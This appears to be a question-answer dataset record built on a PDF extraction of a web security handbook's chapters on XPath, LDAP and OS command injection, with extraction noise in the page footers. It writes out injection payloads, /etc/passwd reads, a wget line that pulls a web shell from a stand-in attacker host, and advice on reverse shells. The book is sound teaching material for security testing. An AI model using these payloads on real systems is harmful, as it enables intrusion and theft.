name of the address node, you can then cycle through\neach of its child nodes, extracting all their names and values. Specifying the\nrelevant child node by index avoids the need to know the names of any nodes.\nFor example, the following query returns the value Hunter:\n//address[position()=3]/child::node()[position()=4]/text()\nAnd the following query returns the value letmein:\n//address[position()=3]/child::node()[position()=6]/text()\ncc0099..iinndddd 334477 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 348\n348 Chapter 9 n Attacking Data Stores\nThis technique can be used in a completely blind attack, where no results are\nreturned within the application’s responses, by crafting an injected condition\nthat specifi es the target node by index. For example, supplying the following\npassword returns results if the fi rst character of Gates’ password is M:\n‘ or substring(//address[position()=1]/child::node()[position()=6]/\ntext(),1,1)= ‘M’ and ‘a’=’a\nBy cycling through every child node of every address node, and extracting\ntheir values one character at a time, you can extract the entire contents of the\nXML data store.\nTIP XPath contains two useful functions that can help you automate the\npreceding attack and quickly iterate through all nodes and data in the XML\ndocument:\nn count() returns the number of child nodes of a given element, which\ncan be used to determine the range of position() values to iterate\nover.\nn string-length() returns the length of a supplied string, which can be\nused to determine the range of substring() values to iterate over.\nTRY IT!\nhttp://mdsec.net/cclookup/19/\nFinding XPath Injection Flaws\nMany of the attack strings that are commonly used to probe for SQL injection\nfl aws typically result in anomalous behavior when submitted to a function that\nis vulnerable to XPath injection. For example, either of the following two strings\nusually invalidates the XPath query syntax and generates an error:\n‘\n‘--\nOne or more of the following strings typically result in some change in the\napplication’s behavior without causing an error, in the same way as they do in\nrelation to SQL injection fl aws:\n‘ or ‘a’=’a\n‘ and ‘a’=’b\nor 1=1\nand 1=2\ncc0099..iinndddd 334488 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 349\nChapter 9 n Attacking Data Stores 349\nHence, in any situation where your tests for SQL injection provide tentative\nevidence for a vulnerability, but you are unable to conclusively exploit the fl aw,\nyou should investigate the possibility that you are dealing with an XPath injec-\ntion fl aw.\n\nHACK STEPS\n1. Try submitting the following values, and determine whether these result\nin different application behavior, without causing an error:\n‘ or count(parent::*[position()=1])=0 or ‘a’=’b\n‘ or count(parent::*[position()=1])>0 or ‘a’=’b\nIf the parameter is numeric, also try the following test strings:\n1 or count(parent::*[position()=1])=0\n1 or count(parent::*[position()=1])>0\n2. If any of the preceding strings causes differential behavior within the\napplication without causing an error, it is likely that you can extract arbi-\ntrary data by crafting test conditions to extract one byte of information at\na time. Use a series of conditions with the following form to determine\nthe name of the current node’s parent:\nsubstring(name(parent::*[position()=1]),1,1)=’a’\n3. Having extracted the name of the parent node, use a series of conditions\nwith the following form to extract all the data within the XML tree:\nsubstring(//parentnodename[position()=1]/child::node()\n[position()=1]/text(),1,1)=’a’\nPreventing XPath Injection\nIf you think it is necessary to insert user-supplied input into an XPath query,\nthis operation should only be performed on simple items of data that can be\nsubjected to strict input validation. The user input should be checked against\na white list of acceptable characters, which should ideally include only alpha-\nnumeric characters. Characters that may be used to interfere with the XPath\nquery should be blocked, including ( ) = ‘ [ ] : , * / and all whitespace.\nAny input that does not match the white list should be rejected, not sanitized.\nInjecting into LDAP\nThe Lightweight Directory Access Protocol (LDAP) is used to access directory\nservices over a network. A directory is a hierarchically organized data store that\nmay contain any kind of information but is commonly used to store personal\ndata such as names, telephone numbers, e-mail addresses, and job functions.\ncc0099..iinndddd 334499 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 350\n350 Chapter 9 n Attacking Data Stores\nCommon examples of LDAP are the Active Directory used within Windows\ndomains, and OpenLDAP, used in various situations. You are most likely to\nencounter LDAP being used in corporate intranet-based web applications, such\nas an HR application that allows users to view and modify information about\nemployees.\nEach LDAP query uses one or more search fi lters, which determine the direc-\ntory entries that are returned by the query. Search fi lters can use various logical\noperators to represent complex search conditions. The most common search\nfi lters you are likely to encounter are as follows:\nn Simple match conditions match on the value of a single attribute. For\nexample, an application function that searches for a user via his username\nmight use this fi lter:\n(username=daf)\nn Disjunctive queries specify multiple conditions, any one of which must\nbe satisfi ed by entries that are returned. For example, a search function\nthat looks up a user-supplied search term in several directory attributes\nmight use this fi lter:\n(|(cn=searchterm)(sn=searchterm)(ou=searchterm))\nn Conjunctive queries specify multiple conditions, all of which must be\nsatisfi ed by entries that are returned. For example, a login mechanism\nimplemented in LDAP might use this fi lter:\n(&(username=daf)(password=secret)\nAs with other forms of injection, if user-supplied input is inserted into an\nLDAP search fi lter without any validation, it may be possible for an attacker\nto supply crafted input that modifi es the fi lter’s structure and thereby retrieve\ndata or perform actions in an unauthorized way.\nIn general, LDAP injection vulnerabilities are not as readily exploitable as\nSQL injection fl aws, due to the following factors:\nn Where the search fi lter employs a logical operator to specify a conjunctive\nor disjunctive query, this usually appears before the point where user-\nsupplied data is inserted and therefore cannot be modifi ed. Hence, simple\nmatch conditions and conjunctive queries don’t have an equivalent to the\n“or 1=1” type of attack that arises with SQL injection.\nn In the LDAP implementations that are in common use, the directory attri-\nbutes to be returned are passed to the LDAP APIs as a separate parameter\nfrom the search fi lter and normally are hard-coded within the application.\ncc0099..iinndddd 335500 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 351\nChapter 9 n Attacking Data Stores 351\nHence, it usually is not possible to manipulate user-supplied input to\nretrieve different attributes than the query was intended to retrieve.\nn Applications rarely return informative error messages, so vulnerabilities\ngenerally need to be exploited “blind.”\nExploiting LDAP Injection\nDespite the limitations just described, in many real-world situations it is possible\nto exploit LDAP injection vulnerabilities to retrieve unauthorized data from the\napplication or to perform unauthorized actions. The details of how this is done typi-\ncally are highly dependent on the construction of the search fi lter, the entry point\nfor user input, and the implementation details of the back-end LDAP service itself.\nDisjunctive Queries\nConsider an application that lets users list employees within a specifi ed depart-\nment of the business. The search results are restricted to the geographic locations\nthat the user is authorized to view. For example, if a user is authorized to view\nthe London and Reading locations, and he searches for the “sales” department,\nthe application performs the following disjunctive query:\n(|(department=London sales)(department=Reading sales))\nHere, the application constructs a disjunctive query and prepends different\nexpressions before the user-supplied input to enforce the required access control.\nIn this situation, an attacker can subvert the query to return details of all\nemployees in all locations by submitting the following search term:\n)(department=*\nThe * character is a wildcard in LDAP; it matches any item. When this input\nis embedded into the LDAP search fi lter, the following query is performed:\n(|(department=London )(department=*)(department=Reading )(department=*))\nSince this is a disjunctive query and contains the wildcard term (depart-\nment=*), it matches on all directory entries. It returns the details of all employees\nfrom all locations, thereby subverting the application’s access control.\nTRY IT!\nhttp://mdsec.net/employees/31/\nhttp://mdsec.net/employees/49/\ncc0099..iinndddd 335511 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 352\n352 Chapter 9 n Attacking Data Stores\nConjunctive Queries\nConsider a similar application function that allows users to search for employ-\nees by name, again within the geographic region they are authorized to view.\nIf a user is authorized to search within the London location, and he searches\nfor the name daf, the following query is performed:\n(&(givenName=daf)(department=London*))\nHere, the user’s input is inserted into a conjunctive query, the second part of\nwhich enforces the required access control by matching items in only one of\nthe London departments.\nIn this situation, two different attacks might succeed, depending on the\ndetails of the back-end LDAP service. Some LDAP implementations, including\nOpenLDAP, allow multiple search fi lters to be batched, and these are applied\ndisjunctively. (In other words, directory entries are returned that match any of\nthe batched fi lters.) For example, an attacker could supply the following input:\n*))(&(givenName=daf\nWhen this input is embedded into the original search fi lter, it becomes:\n(&(givenName=*))(&(givenName=daf)(department=London*))\nThis now contains two search fi lters, the fi rst of which contains a single\nwildcard match condition. The details of all employees are returned from all\nlocations, thereby subverting the application’s access control.\nTRY IT!\nhttp://mdsec.net/employees/42/\nNOTE This technique of injecting a second search fi lter is also effective\nagainst simple match conditions that do not employ any logical operator, pro-\nvided that the back-end implementation accepts multiple search fi lters.\nThe second type of attack against conjunctive queries exploits how many LDAP\nimplementations handle NULL bytes. Because these implementations typically are\nwritten in native code, a NULL byte within a search fi lter effectively terminates the\nstring, and any characters coming after the NULL are ignored. Although LDAP\ndoes not itself support comments (in the way that the -- sequence can be used\nin SQL), this handling of NULL bytes can effectively be exploited to “comment\nout” the remainder of the query.\ncc0099..iinndddd 335522 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 353\nChapter 9 n Attacking Data Stores 353\nIn the preceding example, the attacker can supply the following input:\n*))%00\nThe %00 sequence is decoded by the application server into a literal NULL byte,\nso when the input is embedded into the search fi lter, it becomes:\n(&(givenName=*))[NULL])(department=London*))\nBecause this fi lter is truncated at the NULL byte, as far as LDAP is concerned it\ncontains only a single wildcard condition, so the details of all employees from\ndepartments outside the London area are also returned.\nTRY IT!\nhttp://mdsec.net/employees/13/\nhttp://mdsec.net/employees/42/\nFinding LDAP Injection Flaws\nSupplying invalid input to an LDAP operation typically does not result in an\ninformative error message. In general, the evidence available to you in diagnosing\nvulnerability includes the results returned by a search function and the occur-\nrence of an error such as an HTTP 500 status code. Nevertheless, you can use the\nfollowing steps to identify an LDAP injection fl aw with a degree of reliability.\n\nHACK STEPS\n1. Try entering just the * character as a search term. This character functions\nas a wildcard in LDAP, but not in SQL. If a large number of results are\nreturned, this is a good indicator that you are dealing with an LDAP query.\n2. Try entering a number of closing brackets:\n))))))))))\nThis input closes any brackets enclosing your input, as well as those\nthat encapsulate the main search filter itself. This results in unmatched\nclosing brackets, thus invalidating the query syntax. If an error results, the\napplication may be vulnerable to LDAP injection. (Note that this input may\nalso break many other kinds of application logic, so this provides a strong\nindicator only if you are already confident that you are dealing with an\nLDAP query.)\nContinued\ncc0099..iinndddd 335533 88//1199//22001111 1122::0099::3344 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 354\n354 Chapter 9 n Attacking Data Stores\nHACK STEPS (CONTINUED)\n3. Try entering various expressions designed to interfere with different\ntypes of queries, and see if these allow you to influence the results being\nreturned. The cn attribute is supported by all LDAP implementations and\nis useful to use if you do not know any details about the directory you are\nquerying. For example:\n)(cn=*\n*))(|(cn=*\n*))%00\nPreventing LDAP Injection\nIf it is necessary to insert user-supplied input into an LDAP query, this opera-\ntion should be performed only on simple items of data that can be subjected to\nstrict input validation. The user input should be checked against a white list of\nacceptable characters, which should ideally include only alphanumeric char-\nacters. Characters that may be used to interfere with the LDAP query should\nbe blocked, including ( ) ; , * | & = and the null byte. Any input that does\nnot match the white list should be rejected, not sanitized.\nSummary\nWe have examined a range of vulnerabilities that allow you to inject into web\napplication data stores. These vulnerabilities may allow you to read or modify\nsensitive application data, perform other unauthorized actions, or subvert appli-\ncation logic to achieve an objective.\nAs serious as these attacks are, they are only part of a wider range of attacks\nthat involve injecting into interpreted contexts. Other attacks in this category\nmay allow you to execute commands on the server’s operating system, retrieve\narbitrary fi les, and interfere with other back-end components. The next chapter\nexamines these attacks and others. It looks at how vulnerabilities within a web\napplication can lead to compromise of key parts of the wider infrastructure that\nsupports the application.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. You are trying to exploit a SQL injection fl aw by performing a UNION attack\nto retrieve data. You do not know how many columns the original query\nreturns. How can you fi nd this out?\ncc0099..iinndddd 335544 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 355\nChapter 9 n Attacking Data Stores 355\n2. You have located a SQL injection vulnerability in a string parameter. You\nbelieve the database is either MS-SQL or Oracle, but you can’t retrieve\nany data or an error message to confi rm which database is running. How\ncan you fi nd this out?\n3. You have submitted a single quotation mark at numerous locations through-\nout the application. From the resulting error messages you have diagnosed\nseveral potential SQL injection fl aws. Which one of the following would\nbe the safest location to test whether more crafted input has an effect on\nthe application’s processing?\n(a) Registering a new user\n(b) Updating your personal details\n(c) Unsubscribing from the service\n4. You have found a SQL injection vulnerability in a login function, and\nyou try to use the input ‘ or 1=1-- to bypass the login. Your attack fails,\nand the resulting error message indicates that the -- characters are being\nstripped by the application’s input fi lters. How could you circumvent this\nproblem?\n5. You have found a SQL injection vulnerability but have been unable to\ncarry out any useful attacks, because the application rejects any input\ncontaining whitespace. How can you work around this restriction?\n6. The application is doubling up all single quotation marks within user\ninput before these are incorporated into SQL queries. You have found a\nSQL injection vulnerability in a numeric fi eld, but you need to use a string\nvalue in one of your attack payloads. How can you place a string in your\nquery without using any quotation marks?\n7. In some rare situations, applications construct dynamic SQL queries from\nuser-supplied input in a way that cannot be made safe using parameter-\nized queries. When does this occur?\n8. You have escalated privileges within an application such that you now\nhave full administrative access. You discover a SQL injection vulnerability\nwithin a user administration function. How can you leverage this vulner-\nability to further advance your attack?\n9. You are attacking an application that holds no sensitive data and contains\nno authentication or access control mechanisms. In this situation, how\nshould you rank the signifi cance of the following vulnerabilities?\n(a) SQL injection\n(b) XPath injection\n(c) OS command injection\ncc0099..iinndddd 335555 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 356\n356 Chapter 9 n Attacking Data Stores\n10. You are probing an application function that enables you to search person-\nnel details. You suspect that the function is accessing either a database or\nan Active Directory back end. How could you try to determine which of\nthese is the case?\ncc0099..iinndddd 335566 88//1199//22001111 1122::0099::3344 PPMM",
    "question": "What are the key methods and techniques used to exploit SQL injection vulnerabilities when the application does not provide direct error messages or data retrieval through standard SQL query methods?",
    "summary": "The text discusses SQL injection attacks on web applications, explaining how attackers can exploit vulnerabilities to extract data or execute arbitrary commands. It covers various methods, including using ASCII and SUBSTRING functions to retrieve data, creating out-of-band channels, and using time delays to infer information. It also addresses how to escalate privileges beyond the database, such as accessing the operating system or other databases. Additionally, it explores injection techniques for NoSQL, XPath, and LDAP, highlighting the importance of proper input validation and using parameterized queries to prevent such attacks."
  },
  {
    "start": 276,
    "end": 306,
    "text": "Stuttard c10.indd V2 - 07/05/2011 Page 357\n\nCHAPTER\n10\nAttacking Back-End\nComponents\nWeb applications are increasingly complex offerings. They frequently function\nas the Internet-facing interface to a variety of business-critical resources on the\nback end, including networked resources such as web services, back-end web\nservers, mail servers, and local resources such as fi lesystems and interfaces to the\noperating system. Frequently, the application server also acts as a discretionary\naccess control layer for these back-end components. Any successful attack that\ncould perform arbitrary interaction with a back-end component could potentially\nviolate the entire access control model applied by the web application, allowing\nunauthorized access to sensitive data and functionality.\nWhen data is passed from one component to another, it is interpreted by\ndifferent sets of APIs and interfaces. Data that is considered “safe” by the core\napplication may be extremely unsafe within the onward component, which\nmay support different encodings, escape characters, fi eld delimiters, or string\nterminators. Additionally, the onward component may possess considerably\nmore functionality than what the application normally invokes. An attacker\nexploiting an injection vulnerability can often go beyond merely breaking the\napplication’s access control. She can exploit the additional functionality sup-\nported by the back-end component to compromise key parts of the organiza-\ntion’s infrastructure.\n357\ncc1100..iinndddd 335577 88//1199//22001111 1122::1100::4455 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 358\n358 Chapter 10 n Attacking Back-End Components\nInjecting OS Commands\nMost web server platforms have evolved to the point where built-in APIs exist\nto perform practically any required interaction with the server’s operating\nsystem. Properly used, these APIs can enable developers to access the fi lesys-\ntem, interface with other processes, and carry out network communications in\na safe manner. Nevertheless, there are many situations in which developers\nelect to use the more heavyweight technique of issuing operating system com-\nmands directly to the server. This option can be attractive because of its power\nand simplicity and often provides an immediate and functional solution to\na particular problem. However, if the application passes user-supplied input\nto operating system commands, it may be vulnerable to command injection,\nenabling an attacker to submit crafted input that modifi es the commands that\nthe developers intended to perform.\nThe functions commonly used to issue operating system commands, such\nas exec in PHP and wscript.shell in ASP, do not impose any restrictions on\nthe scope of commands that may be performed. Even if a developer intends\nto use an API to perform a relatively benign task such as listing a directory’s\ncontents, an attacker may be able to subvert it to write arbitrary fi les or launch\nother programs. Any injected commands usually run in the security context\nof the web server process, which often is suffi ciently powerful for an attacker\nto compromise the entire server.\nCommand injection fl aws of this kind have arisen in numerous off-the-shelf\nand custom-built web applications. They have been particularly prevalent within\napplications that provide an administrative interface to an enterprise server or\nto devices such as fi rewalls, printers, and routers. These applications often have\nparticular requirements for operating system interaction that lead developers\nto use direct commands that incorporate user-supplied data.\nExample 1: Injecting Via Perl\nConsider the following Perl CGI code, which is part of a web application for\nserver administration. This function allows administrators to specify a direc-\ntory on the server and view a summary of its disk usage:\n#!/usr/bin/perl\nuse strict;\nuse CGI qw(:standard escapeHTML);\nprint header, start_html(“”);\nprint “<pre>”;\nmy $command = “du -h --exclude php* /var/www/html”;\n$command= $command.param(“dir”);\n$command=`$command`;\ncc1100..iinndddd 335588 88//1199//22001111 1122::1100::4455 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 359\nChapter 10 n Attacking Back-End Components 359\nprint “$command\\n”;\nprint end_html;\nWhen used as intended, this script simply appends the value of the user-\nsupplied dir parameter to the end of a preset command, executes the command,\nand displays the results, as shown in Figure 10-1.\nFigure 10-1: A simple application function for listing a directory’s contents\nThis functionality can be exploited in various ways by supplying crafted input\ncontaining shell metacharacters. These characters have a special meaning to\nthe interpreter that processes the command and can be used to interfere with\nthe command that the developer intended to execute. For example, the pipe\ncharacter (|) is used to redirect the output from one process into the input of\nanother, enabling multiple commands to be chained together. An attacker can\nleverage this behavior to inject a second command and retrieve its output, as\nshown in Figure 10-2.\nHere, the output from the original du command has been redirected as the\ninput to the command cat/etc/passwd. This command simply ignores the\ninput and performs its sole task of outputting the contents of the passwd fi le.\nAn attack as simple as this may appear improbable; however, exactly this type\nof command injection has been found in numerous commercial products. For\nexample, HP OpenView was found to be vulnerable to a command injection\nfl aw within the following URL:\nhttps://target:3443/OvCgi/connectedNodes.ovpl?node=a| [your command] |\ncc1100..iinndddd 335599 88//1199//22001111 1122::1100::4455 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 360\n360 Chapter 10 n Attacking Back-End Components\nFigure 10-2: A successful command injection attack\nExample 2: Injecting Via ASP\nConsider the following C# code, which is part of a web application for admin-\nistering a web server. The function allows administrators to view the contents\nof a requested directory:\nstring dirName = “C:\\\\filestore\\\\” + Directory.Text;\nProcessStartInfo psInfo = new ProcessStartInfo(“cmd”, “/c dir “ +\ndirName);\n...\nProcess proc = Process.Start(psInfo);\nWhen used as intended, this script inserts the value of the user-supplied\nDirectory parameter into a preset command, executes the command, and\ndisplays the results, as shown in Figure 10-3.\nAs with the vulnerable Perl script, an attacker can use shell metacharacters to\ninterfere with the preset command intended by the developer and inject his own\ncommand. The ampersand character (&) is used to batch multiple commands.\nSupplying a fi lename containing the ampersand character and a second com-\nmand causes this command to be executed and its results displayed, as shown\nin Figure 10-4.\ncc1100..iinndddd 336600 88//1199//22001111 1122::1100::4466 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 361\nChapter 10 n Attacking Back-End Components 361\nFigure 10-3: A function to list the contents of a directory\nFigure 10-4: A successful command injection attack\ncc1100..iinndddd 336611 88//1199//22001111 1122::1100::4466 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 362\n362 Chapter 10 n Attacking Back-End Components\nTRY IT!\nhttp://mdsec.net/admin/5/\nhttp://mdsec.net/admin/9/\nhttp://mdsec.net/admin/14/\nInjecting Through Dynamic Execution\nMany web scripting languages support the dynamic execution of code that is\ngenerated at runtime. This feature enables developers to create applications that\ndynamically modify their own code in response to various data and conditions.\nIf user input is incorporated into code that is dynamically executed, an attacker\nmay be able to supply crafted input that breaks out of the intended data context\nand specifi es commands that are executed on the server in the same way as if\nthey had been written by the original developer. The fi rst target of an attacker\nat this point typically is to inject an API that runs OS commands.\nThe PHP function eval is used to dynamically execute code that is passed to\nthe function at runtime. Consider a search function that enables users to create\nstored searches that are then dynamically generated as links within their user\ninterface. When users access the search function, they use a URL like the following:\n/search.php?storedsearch=\\$mysearch%3dwahh\nThe server-side application implements this functionality by dynamically\ngenerating variables containing the name/value pairs specifi ed in the stored-\nsearch parameter, in this case creating a mysearch variable with the value wahh:\n$storedsearch = $_GET[‘storedsearch’];\neval(“$storedsearch;”);\nIn this situation, you can submit crafted input that is dynamically executed\nby the eval function, resulting in injection of arbitrary PHP commands into\nthe server-side application. The semicolon character can be used to batch com-\nmands in a single parameter. For example, to retrieve the contents of the fi le\n/etc/password, you could use either the file_get_contents or system command:\n/search.php?storedsearch=\\$mysearch%3dwahh;%20echo%20file_get\n_contents(‘/etc/passwd’)\n/search.php?storedsearch=\\$mysearch%3dwahh;%20system(‘cat%20/etc/\npasswd’)\nNOTE The Perl language also contains an eval function that can be\nexploited in the same way. Note that the semicolon character may need to\nbe URL-encoded (as %3b) because some CGI script parsers interpret this as a\nparameter delimiter. In classic ASP, Execute() performs a similar role.\ncc1100..iinndddd 336622 88//1199//22001111 1122::1100::4466 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 363\nChapter 10 n Attacking Back-End Components 363\nFinding OS Command Injection Flaws\nIn your application mapping exercises (see Chapter 4), you should have identi-\nfi ed any instances where the web application appears to be interacting with\nthe underlying operating system by calling external processes or accessing the\nfi lesystem. You should probe all these functions, looking for command injection\nfl aws. In fact, however, the application may issue operating system commands\ncontaining absolutely any item of user-supplied data, including every URL and\nbody parameter and every cookie. To perform a thorough test of the application,\nyou therefore need to target all these items within every application function.\nDifferent command interpreters handle shell metacharacters in different ways.\nIn principle, any type of application development platform or web server may\ncall out to any kind of shell interpreter, running either on its own operating sys-\ntem or that of any other host. Therefore, you should not make any assumptions\nabout the application’s handling of metacharacters based on any knowledge of\nthe web server’s operating system.\nTwo broad types of metacharacters may be used to inject a separate command\ninto an existing preset command:\nn The characters ;|& and newline may be used to batch multiple commands,\none after the other. In some cases, these characters may be doubled with\ndifferent effects. For example, in the Windows command interpreter,\nusing&& causes the second command to run only if the fi rst is successful.\nUsing || causes the second command to always run, regardless of the\nsuccess of the fi rst.\nn The backtick character (`) can be used to encapsulate a separate command\nwithin a data item being processed by the original command. Placing an\ninjected command within backticks causes the shell interpreter to execute\nthe command and replace the encapsulated text with the results of this\ncommand before continuing to execute the resulting command string.\nIn the previous examples, it was straightforward to verify that command injec-\ntion was possible and to retrieve the results of the injected command, because\nthose results were returned immediately within the application’s response.\nIn many cases, however, this may not be possible. You may be injecting into a\ncommand that returns no results and which does not affect the application’s\nsubsequent processing in any identifi able way. Or the method you have used\nto inject your chosen command may be such that its results are lost as multiple\ncommands are batched together.\nIn general, the most reliable way to detect whether command injection is\npossible is to use time-delay inference in a similar way as was described for\nexploiting blind SQL injection. If a potential vulnerability appears to exist, you\ncan then use other methods to confi rm this and to retrieve the results of your\ninjected commands.\ncc1100..iinndddd 336633 88//1199//22001111 1122::1100::4466 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 364\n364 Chapter 10 n Attacking Back-End Components\n\nHACK STEPS\n1. You can normally use the ping command as a means of triggering a time\ndelay by causing the server to ping its loopback interface for a specific\nperiod. There are minor differences between how Windows and UNIX-\nbased platforms handle command separators and the ping command.\nHowever, the following all-purpose test string should induce a 30-second\ntime delay on either platform if no filtering is in place:\n|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &\nTo maximize your chances of detecting a command injection flaw if the\napplication is filtering certain command separators, you should also sub-\nmit each of the following test strings to each targeted parameter in turn\nand monitor the time taken for the application to respond:\n| ping –i 30 127.0.0.1 |\n| ping –n 30 127.0.0.1 |\n& ping –i 30 127.0.0.1 &\n& ping –n 30 127.0.0.1 &\n; ping 127.0.0.1 ;\n%0a ping –i 30 127.0.0.1 %0a\n` ping 127.0.0.1 `\n2. If a time delay occurs, the application may be vulnerable to command\ninjection. Repeat the test case several times to confirm that the delay was\nnot the result of network latency or other anomalies. You can try changing\nthe value of the -n or -i parameters and confirming that the delay expe-\nrienced varies systematically with the value supplied.\n3. Using whichever of the injection strings was found to be successful, try\ninjecting a more interesting command (such as ls or dir). Determine\nwhether you can retrieve the results of the command to your browser.\n4. If you are unable to retrieve results directly, you have other options:\nn You can attempt to open an out-of-band channel back to your computer.\nTry using TFTP to copy tools up to the server, using telnet or netcat to\ncreate a reverse shell back to your computer, and using the mail com-\nmand to send command output via SMTP.\nn You can redirect the results of your commands to a fi le within the web\nroot, which you can then retrieve directly using your browser. For example:\ndir > c:\\inetpub\\wwwroot\\foo.txt\n5. When you have found a means of injecting commands and retrieving the\nresults, you should determine your privilege level (by using whoami or\nsomething similar, or attempting to write a harmless file to a protected\ndirectory). You may then seek to escalate privileges, gain backdoor access\nto sensitive application data, or attack other hosts reachable from the\ncompromised server.\ncc1100..iinndddd 336644 88//1199//22001111 1122::1100::4466 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 365\nChapter 10 n Attacking Back-End Components 365\nIn some cases, it may not be possible to inject an entirely separate com-\nmand due to fi ltering of required characters or the behavior of the command\nAPI being used by the application. Nevertheless, it may still be possible to\ninterfere with the behavior of the command being performed to achieve\nsome desired result.\nIn one instance seen by the authors, the application passed user input\nto the operating system command nslookup to fi nd the IP address of a\ndomain name supplied by the user. The metacharacters needed to inject new\ncommands were being blocked, but the < and > characters used to redirect\nthe command’s input and output were allowed. The nslookup command\nusually outputs the IP address for a domain name, which did not seem to\nprovide an effective attack vector. However, if an invalid domain name is\nsupplied, the command outputs an error message that includes the domain\nname that was looked up. This behavior proved suffi cient to deliver a\nserious attack:\nn Submit a fragment of server-executable script code as the domain name\nto be resolved. The script can be encapsulated in quotes to ensure that\nthe command interpreter treats it as a single token.\nn Use the > character to redirect the command’s output to a fi le in an execut-\nable folder within the web root. The command executed by the operating\nsystem is as follows:\nnslookup “[script code]” > [/path/to/executable_file]\nn When the command is run, the following output is redirected to the execut-\nable fi le:\n** server can’t find [script code]: NXDOMAIN\nn This fi le can then be invoked using a browser, and the injected script\ncode is executed on the server. Because most scripting languages allow\npages to contain a mix of client-side content and server-side markup,\nthe parts of the error message that the attacker does not control are\njust treated as plain text, and the markup within the injected script is\nexecuted. The attack therefore succeeds in leveraging a restricted com-\nmand injection condition to introduce an unrestricted backdoor into the\napplication server.\nTRY IT!\nhttp://mdsec.net/admin/18/\ncc1100..iinndddd 336655 88//1199//22001111 1122::1100::4477 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 366\n366 Chapter 10 n Attacking Back-End Components\n\nHACK STEPS\n1. The < and > characters are used, respectively, to direct the contents of a\nfile to the command’s input and to direct the command’s output to a file.\nIf it is not possible to use the preceding techniques to inject an entirely\nseparate command, you may still be able to read and write arbitrary file\ncontents using the < and > characters.\n2. Many operating system commands that applications invoke accept a num-\nber of command-line parameters that control their behavior. Often, user-\nsupplied input is passed to the command as one of these parameters, and\nyou may be able to add further parameters simply by inserting a space\nfollowed by the relevant parameter. For example, a web-authoring appli-\ncation may contain a function in which the server retrieves a user-speci-\nfied URL and renders its contents in-browser for editing. If the application\nsimply calls out to the wget program, you may be able to write arbitrary\nfile contents to the server’s filesystem by appending the -O command-line\nparameter used by wget. For example:\nurl=http://wahh-attacker.com/%20-O%20c:\\inetpub\\wwwroot\\scripts\\\ncmdasp.asp\nTIP Many command injection attacks require you to inject spaces to sepa-\nrate command-line arguments. If you fi nd that spaces are being fi ltered by\nthe application, and the platform you are attacking is UNIX-based, you may\nbe able to use the $IFS environment variable instead, which contains the\nwhitespace fi eld separators.\nFinding Dynamic Execution Vulnerabilities\nDynamic execution vulnerabilities most commonly arise in languages such\nas PHP and Perl. But in principle, any type of application platform may pass\nuser-supplied input to a script-based interpreter, sometimes on a different\nback-end server.\ncc1100..iinndddd 336666 88//1199//22001111 1122::1100::4477 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 367\nChapter 10 n Attacking Back-End Components 367\n\nHACK STEPS\n1. Any item of user-supplied data may be passed to a dynamic execution\nfunction. Some of the items most commonly used in this way are the\nnames and values of cookie parameters and persistent data stored in user\nprofiles as the result of previous actions.\n2. Try submitting the following values in turn as each targeted parameter:\n;echo%20111111\necho%20111111\nresponse.write%20111111\n:response.write%20111111\n3. Review the application’s responses. If the string 111111 is returned on its\nown (is not preceded by the rest of the command string), the application\nis likely to be vulnerable to the injection of scripting commands.\n4. If the string 111111 is not returned, look for any error messages that indi-\ncate that your input is being dynamically executed and that you may need\nto fine-tune your syntax to achieve injection of arbitrary commands.\n5. If the application you are attacking uses PHP, you can use the test string\nphpinfo(), which, if successful, returns the configuration details of the\nPHP environment.\n6. If the application appears to be vulnerable, verify this by injecting some\ncommands that result in time delays, as described previously for OS com-\nmand injection. For example:\nsystem(‘ping%20127.0.0.1’)\nPreventing OS Command Injection\nIn general, the best way to prevent OS command injection fl aws from arising\nis to avoid calling out directly to operating system commands. Virtually any\nconceivable task that a web application may need to carry out can be achieved\nusing built-in APIs that cannot be manipulated to perform commands other\nthan the one intended.\nIf it is considered unavoidable to embed user-supplied data into command\nstrings that are passed to an operating system command interpreter, the appli-\ncation should enforce rigorous defenses to prevent a vulnerability from arising.\nIf possible, a whitelist should be used to restrict user input to a specifi c set of\nexpected values. Alternatively, the input should be restricted to a very narrow\ncharacter set, such as alphanumeric characters only. Input containing any other\ndata, including any conceivable metacharacter or whitespace, should be rejected.\ncc1100..iinndddd 336677 88//1199//22001111 1122::1100::4477 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 368\n368 Chapter 10 n Attacking Back-End Components\nAs a further layer of protection, the application should use command APIs\nthat launch a specifi c process via its name and command-line parameters,\nrather than passing a command string to a shell interpreter that supports\ncommand chaining and redirection. For example, the Java API Runtime.exec\nand the ASP.NET API Process.Start do not support shell metacharacters.\nIf used properly, they can ensure that only the command intended by the\ndeveloper will be executed. See Chapter 19 for more details of command\nexecution APIs.\nPreventing Script Injection Vulnerabilities\nIn general, the best way to avoid script injection vulnerabilities is to not pass\nuser-supplied input, or data derived from it, into any dynamic execution or\ninclude functions. If this is considered unavoidable for some reason, the rel-\nevant input should be strictly validated to prevent any attack from occurring.\nIf possible, use a whitelist of known good values that the application expects,\nand reject any input that does not appear on this list. Failing that, check the\ncharacters used within the input against a set known to be harmless, such 